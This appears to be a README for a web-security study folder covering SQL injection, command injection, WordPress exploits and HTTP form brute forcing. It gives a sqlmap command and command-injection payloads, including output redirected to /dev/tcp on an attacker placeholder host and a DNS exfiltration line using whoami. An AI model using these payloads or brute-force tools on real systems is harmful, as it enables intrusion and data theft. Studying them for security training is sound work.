# 2-Web-Security

Web application security topics including injection attacks, brute forcing, and authentication bypass.

## Topics Covered

- **SQL Injection**: UNION-based, time-based, and SQLMap techniques
- **Command Injection**: OS command injection with and without filters
- **Blind Injection**: Blind command and SQL injection techniques
- **WordPress Vulnerabilities**: Common WordPress plugin/theme exploits
- **HTTP Form Brute Force**: Username/password enumeration
- **Web Reconnaissance**: Directory listing, autocomplete, and information gathering

## Tools and Scripts

### bruteforce.py
Python script for HTTP form brute forcing.

```bash
# Basic usage
python3 bruteforce.py

# With custom configuration
# Edit the script and update:
# - target: http://[TARGET_IP]
# - username: admin
# - password_file: passwords.txt
```

### bruteforce.go
Go implementation of HTTP form brute forcing.

```bash
# Compile
go build -o bruteforce bruteforce.go

# Run
./bruteforce
```

## SQL Injection Techniques

```bash
# UNION-based injection
# Useful when you can see output in response

# SQLMap for POST data
sqlmap -u "http://[TARGET_IP]/page.php" \
    --data="username=admin&password=*" \
    -p password \
    --dbs
```

## Command Injection

```bash
# Basic command injection
; command_here

# With output redirection
; command_here > /dev/tcp/[ATTACKER_IP]/PORT

# Blind injection (no visible output)
; nslookup `whoami`.[ATTACKER_DOMAIN]
```

## Quick Commands

```bash
# Find SQL injection topics
grep -r "SQL" . --include="*.md"

# Find command injection
grep -r "Command Injection\|command injection" . --include="*.md"

# Find WordPress content
grep -r "Wordpress\|WordPress" . --include="*.md"

# Find brute force techniques
grep -r "brute\|Brute" . --include="*.md"
```

## Learning Resources

1. Start with SQL injection basics
2. Progress to command injection
3. Study blind injection techniques
4. Learn WordPress-specific exploits
5. Practice with provided tools

## Security Note

All scripts require a valid target URL. Replace `[TARGET_IP]` with your target before running.
